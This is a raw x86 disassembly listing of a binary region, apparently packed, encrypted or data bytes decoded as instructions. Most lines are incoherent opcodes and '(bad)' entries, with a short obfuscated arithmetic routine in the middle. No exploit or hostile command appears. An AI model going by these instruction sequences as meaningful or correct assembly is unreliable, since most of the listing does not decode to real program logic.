  413327:	push   eax
  413328:	push   ds
  413329:	mov    al,0x85
  41332b:	mov    eax,ds:0x394ff040
  413330:	adc    BYTE PTR [ebp+0x7ff62e77],cl
  413336:	in     al,dx
  413337:	dec    esi
  413338:	add    esp,DWORD PTR [edx+0xa80aeca]
  41333e:	sti    
  41333f:	add    al,0x2d
  413341:	test   eax,0xa196d5a4
  413346:	int3   
  413347:	scas   al,BYTE PTR es:[edi]
  413348:	inc    esi
  413349:	jo     0x413326
  41334b:	xor    bh,bl
  41334d:	or     eax,DWORD PTR [eax-0x7d]
  413350:	jecxz  0x413384
  413352:	xchg   esp,eax
  413353:	addr16 pop es
  413355:	daa    
  413356:	(bad)  
  413357:	scas   al,BYTE PTR es:[edi]
  413358:	and    cl,BYTE PTR [ebx+0x3f]
  41335b:	xchg   edx,eax
  41335c:	pop    esp
  41335d:	xchg   edi,eax
  41335e:	push   0xffffffd4
  413360:	lea    edx,[ecx+0x38]
  413363:	xchg   ebx,eax
  413364:	call   0xfff2:0xa8e44752
  41336b:	sbb    BYTE PTR [ebx-0x7],ch
  41336e:	das    
  41336f:	xchg   edi,eax
  413370:	inc    ebx
  413371:	push   ss
  413372:	ss dec ebp
  413374:	js     0x413393
  413376:	ja     0x4133f2
  413378:	loope  0x413346
  41337a:	mov    al,0x9d
  41337c:	arpl   WORD PTR [ebx+esi*8+0x50],sp
  413380:	gs pusha 
  413382:	mov    bh,0x7b
  413384:	xor    BYTE PTR [ebp+0x74e52b53],ch
  41338a:	push   0x69
  41338c:	sahf   
  41338d:	icebp  
  41338e:	in     eax,dx
  41338f:	int    0x2f
  413391:	leave  
  413392:	call   0x917f45c5
  413397:	in     al,dx
  413398:	into   
  413399:	jb     0x4133cc
  41339b:	fld    TBYTE PTR [edx]
  41339d:	add    esp,DWORD PTR [edi]
  41339f:	scas   al,BYTE PTR es:[edi]
  4133a0:	xor    DWORD PTR [edx+eax*2+0x29],0xffffffd6
  4133a5:	pop    esi
  4133a6:	fdiv   DWORD PTR [eax-0x2f]
  4133a9:	popf   
  4133aa:	jns    0x413411
  4133ac:	mov    ds:0x534478a,eax
  4133b1:	and    al,0x51
  4133b3:	scas   al,BYTE PTR es:[edi]
  4133b4:	bound  eax,QWORD PTR [ecx+0x45ac84bf]
  4133ba:	out    dx,eax
  4133bb:	shr    BYTE PTR [ebx+0x79],1
  4133be:	xchg   ebp,eax
  4133bf:	mov    ds:0xf95505d6,eax
  4133c4:	cmp    DWORD PTR [ecx+0x36],0xfc4726c2
  4133cb:	xchg   ebx,eax
  4133cc:	std    
  4133cd:	pushf  
  4133ce:	fmul   QWORD PTR [ecx-0x6ac35c79]
  4133d4:	mov    eax,ds:0x9f3dd713
  4133d9:	inc    esi
  4133da:	imul   esp,DWORD PTR [edx-0x6b08be77],0x79
  4133e1:	sahf   
  4133e2:	mov    WORD PTR [ecx+0xf2a95a3],gs
  4133e8:	inc    edx
  4133e9:	dec    esp
  4133ea:	ret    0xf8d4
  4133ed:	cmp    al,0x3b
  4133ef:	mov    eax,0x8bfdcaaf
  4133f4:	push   es
  4133f5:	cmp    al,0xed
  4133f7:	add    DWORD PTR [eax-0x7e],ecx
  4133fa:	jmp    0x413476
  4133fc:	xchg   ebx,eax
  4133fd:	lods   eax,DWORD PTR ds:[esi]
  4133fe:	push   cs
  4133ff:	les    eax,FWORD PTR [edx]
  413401:	sub    BYTE PTR [ecx],bl
  413403:	add    DWORD PTR [ebp+0x6f],ebp
  413406:	jl     0x4133e3
  413408:	push   esp
  413409:	jmp    0x1e6b:0xa71d8654
  413410:	stos   BYTE PTR es:[edi],al
  413411:	aam    0x96
  413413:	fist   DWORD PTR [esi]
  413415:	shr    dl,cl
  413417:	test   eax,0xd127c33a
  41341c:	loop   0x4133c1
  41341e:	lods   al,BYTE PTR ds:[esi]
  41341f:	dec    eax
  413420:	fisubr WORD PTR [eax+0x514da788]
  413426:	fucomi st,st(6)
  413428:	ja     0x41340d
  41342a:	xchg   esp,eax
  41342b:	mov    esp,esi
  41342d:	sub    edi,edi
  41342f:	and    eax,0xc90892a3
  413434:	inc    ebp
  413435:	push   edx
  413436:	iret   
  413437:	loope  0x41340c
  413439:	lods   eax,DWORD PTR ds:[esi]
  41343a:	shl    DWORD PTR [esi+0x6f],0xd2
  41343e:	sbb    BYTE PTR [ebx+0x504ccc6f],dh
  413444:	(bad)  
  413446:	jae    0x4134be
  413448:	ret    
  413449:	inc    ebx
  41344a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41344b:	adc    BYTE PTR [ebx],0x32
  41344e:	pusha  
  41344f:	mov    dh,0x18
  413451:	iret   
  413452:	mov    bh,0xf6
  413454:	sbb    al,0x8f
  413456:	mov    dx,0xe3c7
  41345a:	mov    BYTE PTR [edx+edi*2+0x56],al
  41345e:	test   al,0x40
  413460:	out    dx,al
  413461:	aas    
  413462:	repnz pop ebx
  413464:	jg     0x413432
  413466:	repz test esp,esi
  413469:	cmp    esp,edi
  41346b:	jne    0x4133ee
  41346d:	sbb    BYTE PTR [eax+eax*8],cl
  413470:	idiv   ebx
  413472:	aaa    
  413473:	push   esp
  413474:	mov    esp,0x93072536
  413479:	fsub   QWORD PTR [eax+edx*4-0x5b0b8116]
  413480:	jmp    FWORD PTR [esi+0x42f74d2c]
  413486:	enter  0xee8a,0x48
  41348a:	cmp    DWORD PTR [edi+edi*4-0x7b],0x1a8c252a
  413492:	sbb    eax,0x5cdcc5f5
  413497:	cmp    BYTE PTR [esi-0x5ef43025],bl
  41349d:	xchg   ecx,ebx
  41349f:	mov    ch,BYTE PTR [ebx+0x60faa2d8]
  4134a5:	jecxz  0x4134e9
  4134a7:	push   ebx
  4134a8:	and    eax,0xe623abb7
  4134ad:	gs mov esi,0x8f745427
  4134b3:	push   esp
  4134b5:	mov    eax,ds:0x63a82754
  4134ba:	pop    DWORD PTR [ecx]
  4134bc:	cmp    edx,DWORD PTR [ebp-0x51]
  4134bf:	lods   al,BYTE PTR ds:[esi]
  4134c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134c1:	lock push edx
  4134c3:	jg     0x413515
  4134c5:	cmp    al,0x28
  4134c7:	adc    DWORD PTR [edi],ecx
  4134c9:	(bad)  
  4134ca:	fwait
  4134cb:	cmp    eax,0xe13d7509
  4134d0:	xchg   edi,eax
  4134d1:	mov    esi,0x3f901abc
  4134d6:	jmp    0xdc5a:0xd21afd88
  4134dd:	jno    0x4134e6
  4134df:	(bad)  
  4134e0:	ficomp WORD PTR ds:0xf7629131
  4134e6:	xor    al,BYTE PTR [edx]
  4134e8:	mov    BYTE PTR [ebp+0x3a],ah
  4134eb:	and    al,0x4f
  4134ed:	icebp  
  4134ee:	xchg   esp,eax
  4134ef:	imul   BYTE PTR [ebp+0x7779753f]
  4134f5:	mov    ebx,0x640ccd1f
  4134fa:	inc    ebx
  4134fb:	mov    edx,0x71f9911b
  413500:	sub    BYTE PTR [ebx+0x6e],al
  413503:	aad    0xca
  413505:	leave  
  413506:	in     eax,dx
  413507:	stos   BYTE PTR es:[edi],al
  413508:	retf   0x38a5
  41350b:	mov    eax,0xc24cd7c0
  413510:	test   edi,ebx
  413512:	test   al,0x79
  413514:	lock pushf 
  413516:	push   ss
  413517:	rol    BYTE PTR [esi+0x7],1
  41351a:	ss xchg ebx,eax
  41351c:	ins    BYTE PTR es:[edi],dx
  41351d:	xchg   ecx,eax
  41351e:	cmc    
  41351f:	inc    esp
  413520:	sub    DWORD PTR [edi],0x6865634b
  413526:	xor    DWORD PTR ds:0xe8b96af2,ebx
  41352c:	fwait
  41352d:	mov    gs,WORD PTR [edi-0x576da667]
  413533:	call   0xbdd5:0x7e95caa6
  41353a:	xchg   ebx,eax
  41353b:	(bad)  
  41353c:	xlat   BYTE PTR ds:[ebx]
  41353d:	dec    esi
  41353e:	add    DWORD PTR [eax],0xffffffa4
  413541:	fidiv  WORD PTR [edx-0x4b]
  413544:	div    ebp
  413546:	push   ecx
  413547:	js     0x413545
  413549:	inc    esi
  41354a:	push   cs
  41354b:	cs dec edi
  41354d:	aad    0x87
  41354f:	cmp    DWORD PTR [ebx],ecx
  413551:	push   es
  413552:	add    cl,cl
  413554:	fcmove st,st(7)
  413556:	mov    cl,0x66
  413558:	cmc    
  413559:	jg     0x4135ba
  41355b:	inc    edi
  41355c:	dec    ebx
  41355d:	mov    eax,DWORD PTR [esi+0x29acddc7]
  413563:	imul   ecx,DWORD PTR [edx+0x3d154b06],0x18b2fcc4
  41356d:	mov    eax,0xe06b7c6b
  413572:	jmp    0x642e:0x81d57f10
  413579:	inc    ebx
  41357a:	repz mov esi,cs
  41357d:	jnp    0x413550
  41357f:	mov    WORD PTR [edx],es
  413581:	test   dh,0x93
  413584:	sbb    DWORD PTR [edi+0x26],ebx
  413587:	inc    edi
  413588:	jbe    0x4135ff
  41358a:	inc    edx
  41358b:	js     0x413601
  41358d:	jbe    0x41356c
  41358f:	xor    al,0xd0
  413591:	cmp    ebx,esp
  413593:	add    bh,BYTE PTR [edi+edi*4-0x6]
  413597:	jg     0x41359e
  413599:	mov    ecx,0xfb24cfdc
  41359e:	imul   ebp,DWORD PTR [ebx+0x5e1d3d95],0xf61adca5
  4135a8:	fdivr  QWORD PTR [edi-0x5c]
  4135ab:	jo     0x413577
  4135ad:	ror    ebp,0x13
  4135b0:	mov    ah,0x8d
  4135b2:	dec    esp
  4135b3:	imul   edi,DWORD PTR [edx-0x46768092],0xfffffff7
  4135ba:	fsubrp st(3),st
  4135bc:	xor    eax,0x6c3db480
  4135c1:	div    DWORD PTR [edx-0x23]
  4135c4:	push   ebx
  4135c5:	dec    esi
  4135c6:	xchg   BYTE PTR [esi+0x7247ab5a],ch
  4135cc:	mov    esp,0xd8ee3e40
  4135d1:	std    
  4135d2:	adc    al,0x3f
  4135d4:	jge    0x41360f
  4135d6:	mov    bl,0xb
  4135d8:	pop    es
  4135d9:	out    dx,eax
  4135da:	test   BYTE PTR [bx+si],dh
  4135dd:	std    
  4135de:	mov    edx,0x593b9aeb
  4135e3:	imul   ecx,DWORD PTR [ecx-0x1c97851c],0xd2062120
  4135ed:	outs   dx,BYTE PTR ds:[esi]
  4135ee:	je     0x413653
  4135f0:	cmp    eax,0x31ad1d6f
  4135f6:	push   ebp
  4135f7:	leave  
  4135f8:	dec    ecx
  4135f9:	das    
  4135fa:	hlt    
  4135fb:	mov    WORD PTR [edi],ss
  4135fd:	int3   
  4135fe:	icebp  
  4135ff:	mov    ds:0x24d5524,al
  413604:	mov    ch,0xa7
  413606:	(bad)  
  413608:	test   BYTE PTR [edx-0x4cf28569],0x5c
  41360f:	sbb    ah,BYTE PTR [edx]
  413611:	shrd   DWORD PTR [ebx],esi,0xf7
  413615:	sbb    ebp,DWORD PTR [edx]
  413617:	shr    DWORD PTR [esi],0x48
  41361a:	jno    0x413637
  41361c:	fnsave [edx]
  41361e:	or     eax,0xfb2bbf27
  413623:	inc    ebx
  413624:	jmp    FWORD PTR [edi]
  413626:	dec    esp
  413627:	aad    0x92
  413629:	mov    bh,0x9d
  41362b:	mov    al,ds:0xf1e08e47
  413630:	retf   
  413631:	sbb    DWORD PTR [ecx+0x4ea9cb70],edi
  413637:	(bad)  
  413638:	or     BYTE PTR [edx],bl
  41363a:	lock clc 
  41363c:	mov    ebx,0x7ea9682f
  413641:	xchg   ecx,eax
  413642:	arpl   WORD PTR [ebx+eax*2-0x7de81010],cx
  413649:	test   eax,0x28964a46
  41364e:	clc    
  41364f:	xor    ah,BYTE PTR [ecx]
  413651:	lea    ecx,[edi-0x77c36f9c]
  413657:	daa    
  413658:	sbb    DWORD PTR [ebx],edx
  41365a:	push   ecx
  41365b:	stc    
  41365c:	imul   edx,DWORD PTR [edx+ebx*8+0xe],0x5c0e60e7
  413664:	ss lahf 
  413666:	std    
  413667:	lods   al,BYTE PTR ds:[esi]
  413668:	and    ch,ch
  41366a:	add    eax,0xe609cc6b
  41366f:	fisub  WORD PTR [edx-0x45cae5bb]
  413675:	popa   
  413676:	test   eax,0x1328946c
  41367b:	mov    esi,0x4b2bf852
  413680:	test   BYTE PTR [ebp-0x53],al
  413683:	retf   0xc320
  413686:	sbb    eax,0xa3d80401
  41368b:	add    eax,0x8301dbb6
  413690:	sub    DWORD PTR [edx+edx*2-0x6d],esi
  413694:	xchg   ecx,eax
  413695:	fs ret 0x6998
  413699:	pop    ss
  41369a:	pop    ebx
  41369b:	fwait
  41369c:	pop    eax
  41369d:	std    
  41369e:	ret    0x9044
  4136a1:	sbb    eax,0x922023e7
  4136a6:	or     DWORD PTR es:[ecx+0x7f],ebx
  4136aa:	push   ebx
  4136ab:	dec    ebp
  4136ac:	or     DWORD PTR [ebx],ebp
  4136ae:	jmp    0xfe78:0xb40aaa77
  4136b5:	clc    
  4136b6:	outs   dx,DWORD PTR ds:[esi]
  4136b7:	inc    esi
  4136b8:	mov    cl,0xda
  4136ba:	rcr    BYTE PTR [ebx-0x1abd6ece],cl
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xbd
  413798:	xchg   edx,eax
  413799:	mov    eax,ds:0x626ba212
  41379e:	(bad)  
  41379f:	int    0x5f
  4137a1:	bound  esp,QWORD PTR [edx-0x1e]
  4137a4:	ins    BYTE PTR es:[edi],dx
  4137a5:	sbb    bh,BYTE PTR [edx-0x75]
  4137a8:	inc    ebx
  4137a9:	je     0x413786
  4137ab:	pop    edx
  4137ac:	add    DWORD PTR [ecx],esp
  4137ae:	mov    ebx,0xa5284ae0
  4137b3:	cmp    bh,BYTE PTR [eax+0x2c]
  4137b6:	outs   dx,BYTE PTR ds:[esi]
  4137b7:	xor    eax,DWORD PTR [esi+ebp*8]
  4137ba:	dec    ecx
  4137bb:	(bad)  
  4137bc:	popf   
  4137bd:	shr    BYTE PTR [ecx],0xd
  4137c0:	inc    eax
  4137c1:	dec    ebx
  4137c2:	sbb    BYTE PTR [esi+0x6eb1d],cl
  4137c8:	sub    ch,BYTE PTR [ecx]
  4137ca:	jnp    0x41382d
  4137cc:	das    
  4137cd:	inc    edx
  4137ce:	xor    al,0x6c
  4137d0:	adc    eax,0xb4bcbbbe
  4137d5:	cmp    al,0x1f
  4137d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d8:	and    eax,DWORD PTR [esi]
  4137da:	cli    
  4137db:	sub    ecx,DWORD PTR [edx]
  4137dd:	sub    bh,BYTE PTR [esi+0x2319584f]
  4137e3:	jle    0x413806
  4137e5:	clc    
  4137e6:	sub    edx,DWORD PTR [ecx-0x15]
  4137e9:	stos   BYTE PTR es:[edi],al
  4137ea:	xor    bl,0xd0
  4137ed:	xor    BYTE PTR [ebp+0x35],bh
  4137f0:	jns    0x41377c
  4137f2:	mov    edi,0x51dff098
  4137f7:	xchg   edi,eax
  4137f8:	jbe    0x413869
  4137fa:	stc    
  4137fb:	popf   
  4137fc:	and    al,0x7b
  4137fe:	push   es
  4137ff:	or     edi,eax
  413801:	hlt    
  413802:	push   cs
  413803:	retf   
  413804:	test   esp,0x41473ffc
  41380a:	mov    ecx,0x250f7d52
  41380f:	pop    edx
  413810:	cmp    DWORD PTR [esi-0x35],esi
  413813:	cmp    DWORD PTR [ebp-0x1e],edx
  413816:	fwait
  413817:	scas   al,BYTE PTR es:[edi]
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	mov    ds:0xa0ba162a,eax
  41381e:	add    eax,0x9030c30d
  413823:	or     BYTE PTR [ecx-0x35ee3ac0],0x5f
  41382a:	mov    bl,0xd8
  41382c:	lods   eax,DWORD PTR ds:[esi]
  41382d:	gs sub al,0x61
  413830:	push   ds
  413831:	(bad)  
  413833:	mov    dh,al
  413835:	sbb    DWORD PTR [edi+0x73],esp
  413838:	test   eax,0x55063cd0
  41383d:	ret    
  41383e:	ja     0x413831
  413840:	test   eax,0xa6c3c026
  413845:	push   ebp
  413846:	aaa    
  413847:	mov    BYTE PTR [edx+0x5d],dh
  41384a:	xchg   BYTE PTR [ecx-0x49],ah
  41384d:	xchg   ecx,eax
  41384e:	add    DWORD PTR [edi-0x60330701],edx
  413854:	mov    bl,0x4
  413856:	jecxz  0x413820
  413858:	cmp    esp,ebx
  41385a:	xchg   ebx,eax
  41385b:	xor    dh,BYTE PTR [ecx]
  41385d:	mov    dh,0xb5
  41385f:	test   bh,bl
  413861:	dec    edx
  413862:	cmp    eax,0x49e6e1c7
  413867:	aam    0x6c
  413869:	iret   
  41386a:	xor    BYTE PTR [eax],al
  41386c:	adc    edx,DWORD PTR [edx+0x77613afa]
  413872:	pop    ds
  413873:	js     0x41383a
  413875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413876:	mov    ch,0xd7
  413878:	jge    0x4138c9
  41387a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41387b:	jg     0x413836
  41387d:	icebp  
  41387e:	adc    eax,DWORD PTR [edi]
  413880:	xor    DWORD PTR [ebx-0x62],esp
  413883:	cmc    
  413884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413885:	test   BYTE PTR [ecx],0x97
  413888:	add    al,0xd8
  41388a:	pop    eax
  41388b:	test   ebx,esp
  41388d:	je     0x4138a2
  41388f:	das    
  413890:	and    esi,ebp
  413892:	loope  0x4138cb
  413894:	pop    esp
  413895:	mov    ds:0x9b0f39ca,al
  41389a:	lods   al,BYTE PTR ds:[esi]
  41389b:	sbb    eax,DWORD PTR [ecx+0x2f3213f2]
  4138a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138a2:	jg     0x413866
  4138a4:	fistp  WORD PTR [edi+0x5943c886]
  4138aa:	ret    0x1129
  4138ad:	xchg   ecx,eax
  4138ae:	enter  0x3fb9,0xcb
  4138b2:	mov    ds:0xb78cc74,al
  4138b7:	xlat   BYTE PTR ds:[ebx]
  4138b8:	out    0x50,eax
  4138ba:	or     DWORD PTR [eax-0x409c899],ebp
  4138c0:	add    esi,ecx
  4138c2:	iret   
  4138c3:	mov    eax,ds:0xbbdc3090
  4138c8:	das    
  4138c9:	inc    esi
  4138ca:	pop    es
  4138cb:	imul   esp,DWORD PTR [esi+edi*1],0x10
  4138cf:	add    al,0xfc
  4138d1:	(bad)  
  4138d2:	frstor [ebp+0x2a]
  4138d5:	or     BYTE PTR [edi-0x3185a47e],cl
  4138db:	fild   WORD PTR ss:[eax+0x7d]
  4138df:	adc    eax,0x8a5e739d
  4138e4:	scas   al,BYTE PTR es:[edi]
  4138e5:	sub    al,0xec
  4138e7:	out    dx,eax
  4138e8:	sub    DWORD PTR [edx-0x303107c2],edi
  4138ee:	push   gs
  4138f0:	test   al,0x2c
  4138f2:	and    eax,0x7470e9e1
  4138f7:	mov    esi,0xd38438f0
  4138fc:	push   esp
  4138fd:	xchg   ebp,eax
  4138fe:	jecxz  0x4138dd
  413900:	es out 0x77,eax
  413903:	push   edx
  413904:	xor    al,0xac
  413906:	xchg   esi,eax
  413907:	and    eax,0x8951502d
  41390c:	xor    eax,0xf6405077
  413911:	xchg   edx,eax
  413912:	jp     0x4138d4
  413914:	out    dx,eax
  413915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413916:	imul   ecx,DWORD PTR [eax+0x7b495925],0x37
  41391d:	rcr    DWORD PTR [ebx+ecx*4-0x6f],cl
  413921:	or     DWORD PTR [eax-0xc],ebx
  413924:	add    ebx,DWORD PTR [esi]
  413926:	add    eax,0x675d1da7
  41392b:	inc    edx
  41392c:	arpl   WORD PTR [esi+0x6d],si
  41392f:	push   ss
  413930:	scas   eax,DWORD PTR es:[edi]
  413931:	fcomp  DWORD PTR ds:0x5a6cc949
  413937:	(bad)  
  413938:	cmp    al,0x9a
  41393a:	fsubr  st,st(3)
  41393c:	jbe    0x413934
  41393e:	cwde   
  41393f:	sti    
  413940:	(bad)  
  413941:	stc    
  413942:	repz pop ss
  413944:	imul   eax,DWORD PTR [ebp+0x25],0x29
  413948:	dec    esi
  413949:	dec    ecx
  41394a:	xchg   ecx,eax
  41394b:	adc    eax,edx
  41394d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41394e:	mov    ch,0xab
  413950:	into   
  413951:	stos   DWORD PTR es:[edi],eax
  413952:	push   eax
  413953:	inc    ecx
  413954:	sbb    edx,esi
  413956:	push   ebx
  413957:	clc    
  413958:	(bad)  
  413959:	mov    DWORD PTR [eax+0x268b2549],edi
  41395f:	sbb    dh,dl
  413961:	dec    edi
  413962:	jmp    0x4139a3
  413964:	push   eax
  413965:	cld    
  413966:	dec    edx
  413967:	shl    ah,1
  413969:	push   ecx
  41396a:	ror    BYTE PTR [edx],1
  41396c:	mov    ds:0xde66544d,eax
  413971:	popa   
  413972:	cld    
  413973:	sbb    edi,0xffffffd9
  413976:	mov    esi,0x3d9a639e
  41397b:	jae    0x4139a1
  41397d:	je     0x41397d
  41397f:	mov    es,WORD PTR [ebx]
  413981:	dec    esp
  413982:	pop    ss
  413983:	push   esi
  413984:	xlat   BYTE PTR ds:[ebx]
  413985:	mov    ecx,0xf6823445
  41398a:	aam    0xd5
  41398c:	sub    bl,BYTE PTR [ebp+0x903b375]
  413992:	and    al,0x64
  413994:	and    DWORD PTR [ecx],ebp
  413996:	fsubr  st,st(1)
  413998:	inc    ebx
  413999:	aas    
  41399a:	pop    ds
  41399b:	out    0x49,al
  41399d:	scas   al,BYTE PTR es:[edi]
  41399e:	inc    edx
  41399f:	cmp    ah,al
  4139a1:	sbb    BYTE PTR [edx+eax*8-0x18],dh
  4139a5:	jle    0x413993
  4139a7:	add    ch,cl
  4139a9:	loop   0x4139f7
  4139ab:	hlt    
  4139ac:	cmp    al,BYTE PTR [ecx+0x7500a55a]
  4139b2:	mov    eax,ds:0x40eb8cb3
  4139b7:	mov    esi,esi
  4139b9:	lahf   
  4139ba:	push   ss
  4139bb:	jmp    0xfad5b904
  4139c0:	inc    eax
  4139c1:	stos   DWORD PTR es:[edi],eax
  4139c2:	pusha  
  4139c3:	mov    al,ds:0x411f2a5c
  4139c8:	outs   dx,BYTE PTR ds:[esi]
  4139c9:	das    
  4139ca:	or     al,BYTE PTR [ebx]
  4139cc:	div    DWORD PTR [ebp+0x3c8c6869]
  4139d2:	push   ebx
  4139d3:	fcomip st,st(1)
  4139d5:	aam    0x91
  4139d7:	jno    0x413a29
  4139d9:	xor    BYTE PTR [edx],ch
  4139db:	ds pop edi
  4139dd:	mov    eax,0x19dca8fe
  4139e2:	popa   
  4139e3:	(bad)  
  4139e4:	bound  ecx,QWORD PTR [ebx-0x5f69fe1f]
  4139ea:	xor    BYTE PTR [ebp+0x6675c9fd],0xeb
  4139f1:	dec    eax
  4139f2:	jp     0x413a15
  4139f4:	xchg   esi,eax
  4139f5:	xor    DWORD PTR [ecx-0x68],esp
  4139f8:	mov    cl,0x8a
  4139fa:	popa   
  4139fb:	call   0x41ea:0x819a49f7
  413a02:	jb     0x4139cf
  413a04:	mov    esi,0xe120444c
  413a09:	cli    
  413a0a:	push   edx
  413a0b:	test   eax,0xee37ab39
  413a10:	nop
  413a11:	cli    
  413a12:	(bad)  
  413a14:	out    dx,al
  413a15:	mov    dl,BYTE PTR [edx+0x1257f74d]
  413a1b:	add    BYTE PTR [ecx],al
  413a1d:	retf   
  413a1e:	ret    
  413a1f:	imul   esp,DWORD PTR [edi+0x76],0xe454ebad
  413a26:	test   BYTE PTR [ecx+0x5b61258d],bl
  413a2c:	fcom   DWORD PTR [esp+eiz*2+0xcf89162]
  413a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a34:	pop    ebp
  413a35:	and    BYTE PTR [edi-0x79],al
  413a38:	jge    0x4139d4
  413a3a:	jmp    0x413a42
  413a3c:	adc    edi,ebp
  413a3e:	sub    BYTE PTR [eax-0x2e],ch
  413a41:	sub    al,0x20
  413a43:	jl     0x4139e7
  413a45:	inc    edi
  413a46:	jmp    0x3997a617
  413a4b:	jmp    0x413a13
  413a4d:	scas   al,BYTE PTR es:[edi]
  413a4e:	fs (bad) 
  413a50:	sahf   
  413a51:	in     al,dx
  413a52:	mov    WORD PTR [edi],?
  413a54:	pop    esi
  413a55:	xor    DWORD PTR [ecx-0x4f4fb01b],0x7c
  413a5c:	or     eax,0xb1414c56
  413a61:	in     eax,dx
  413a62:	(bad)  [ebx]
  413a64:	xchg   edx,eax
  413a65:	mov    BYTE PTR [edx+0x7c81fa37],cl
  413a6b:	daa    
  413a6c:	enter  0x6811,0x11
  413a70:	cdq    
  413a71:	xchg   esi,eax
  413a72:	cmp    BYTE PTR [ebp+0x666a3315],dl
  413a78:	sub    DWORD PTR [esi-0xddc7003],esp
  413a7e:	sub    DWORD PTR ds:0xc53940f8,esp
  413a84:	(bad)  
  413a85:	and    ebx,DWORD PTR [esp+ecx*4+0x8]
  413a89:	or     DWORD PTR [esi+edx*2+0x1],ebx
  413a8d:	in     eax,0x92
  413a8f:	push   ebx
  413a90:	in     al,dx
  413a91:	scas   eax,DWORD PTR es:[edi]
  413a92:	xchg   edi,eax
  413a93:	xchg   BYTE PTR [ebp+0x28171fd4],cl
  413a99:	jb     0x413b18
  413a9b:	cmp    eax,0xc9127ab4
  413aa0:	pop    ds
  413aa1:	pop    esi
  413aa2:	cmp    esp,DWORD PTR ss:[ecx]
  413aa5:	addr16 jbe 0x413a7a
  413aa8:	dec    ebx
  413aa9:	add    BYTE PTR [ecx+esi*1-0x7f],ah
  413aad:	or     bh,bl
  413aaf:	retf   0xc245
  413ab2:	inc    edx
  413ab3:	test   eax,0x3ab70c78
  413ab8:	dec    esp
  413ab9:	imul   eax,DWORD PTR ds:0xcbd114d6,0x37
  413ac0:	lods   al,BYTE PTR ds:[esi]
  413ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ac2:	inc    esp
  413ac3:	xchg   esi,eax
  413ac4:	mov    ch,0x0
  413ac6:	ss ds mov bl,0x87
  413aca:	test   al,0xd0
  413acc:	arpl   WORD PTR [ecx+0x4a6de6d],bp
  413ad2:	aas    
  413ad3:	mov    DWORD PTR [edx-0x66],eax
  413ad6:	fiadd  DWORD PTR [ecx-0x3e]
  413ad9:	mov    esp,0x201c5ce2
  413ade:	xlat   BYTE PTR ds:[ebx]
  413adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae0:	imul   BYTE PTR ds:0xd105612d
  413ae6:	sub    dh,al
  413ae8:	pushf  
  413ae9:	iret   
  413aea:	sbb    al,0xf3
  413aec:	fld    QWORD PTR [esp+eiz*8-0x21cf163e]
  413af3:	(bad)  
  413af4:	xor    eax,0xcc19a226
  413af9:	inc    edx
  413afa:	sbb    edx,eax
  413afc:	sbb    dh,bl
  413afe:	adc    edx,0x7
  413b01:	idiv   BYTE PTR [ecx-0x5fd8b388]
  413b07:	mov    bh,0x9d
  413b09:	or     DWORD PTR [eax-0x7acafa01],0xffffffa6
